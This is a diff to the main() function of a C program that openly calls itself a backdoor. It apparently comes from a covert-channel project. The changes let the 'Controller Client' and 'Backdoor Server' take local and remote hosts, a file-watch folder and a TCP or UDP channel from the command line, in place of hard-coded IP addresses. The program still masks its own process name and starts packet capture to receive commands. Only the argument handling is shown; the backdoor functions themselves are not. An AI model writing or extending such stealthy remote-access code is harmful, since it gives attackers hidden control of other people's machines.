@@ -24,6 +24,7 @@
  */
 
 #include <stdio.h>
+#include <ctype.h>
 #include <stdlib.h>
 #include <string.h>
 #include <unistd.h>
@@ -42,11 +43,16 @@ int main(int argc, char *argv[]) {
 	extern int optind, optopt;
 	int c;
 	bool client = false;
-	char source[MAX_LEN];
-	char host[MAX_LEN];
-	char filter[MAX_LEN];
+	char channel[4];
+	char lclhost[MAX_LEN];
+	char rmthost[MAX_LEN];
 	char folder[MAX_LEN];
-	uint32 ipaddr;
+	uint32 src_addr, dst_addr;
+
+	strcpy(channel, "tcp");
+	strncpy(lclhost, DEF_SRC, MAX_LEN);
+	strncpy(rmthost, DEF_DST, MAX_LEN);
+	strncpy(folder, DEF_FOLDER, MAX_LEN);
 
 	while ((c = getopt(argc, argv, OPTIONS)) != -1) {
 		switch (c) {
@@ -57,43 +63,44 @@ int main(int argc, char *argv[]) {
 			client = false;
 			break;
 		case 's': // local host
+			strncpy(lclhost, optarg, MAX_LEN);
 			break;
 		case 'd': // remote host
-			break;
-		case 'f': // filter
+			strncpy(rmthost, optarg, MAX_LEN);
 			break;
 		case 'w': // file watch
+			strncpy(folder, optarg, MAX_LEN);
 			break;
 		case 'h': // help
 			usage(argv[0]);
 			break;
 		case 'x': // channel
+			if (tolower(optarg[0]) == 't') {
+				strcpy(channel, "tcp");
+			} else if (tolower(optarg[0]) == 'u') {
+				strcpy(channel, "udp");
+			}
 			break;
 		case ':': // Missing operand.
-			fprintf(stderr, "-%c requires an operand.\n", optopt);
+			fprintf(stderr, "-%c requires an operand.\n\n", optopt);
 			usage(argv[0]);
 			break;
 		}
 	}
 
-	strcpy(host, "96.55.197.75");
-	strcpy(source, "209.87.60.70");
-
-	printf("copied %s <- %s\n", host, source);
+	fprintf(stderr, "%s ==> %s\n", lclhost, rmthost);
+	fprintf(stderr, "Channel => %s\n", channel);
 
 	// Mask the application name
 	mask_prog(argv[0]);
 
-	printf("masked\n");
-	//ipaddr = resolve(host);
+	src_addr = resolve(lclhost);
+	dst_addr = resolve(rmthost);
 
 	if (client) { // Controller Client
-		// do something
-		backdoor_client(resolve(source), resolve(host), "tcp");
+		backdoor_client(src_addr, dst_addr, channel);
 	} else { // Backdoor Server
-		pcap_init(resolve(source), resolve(host), "./", 1);
-		//cmd_execute("ls", resolve(source), resolve(host));
-		//do something
+		pcap_init(src_addr, dst_addr, folder, 1);
 	}
 
 	return EXIT_SUCCESS;
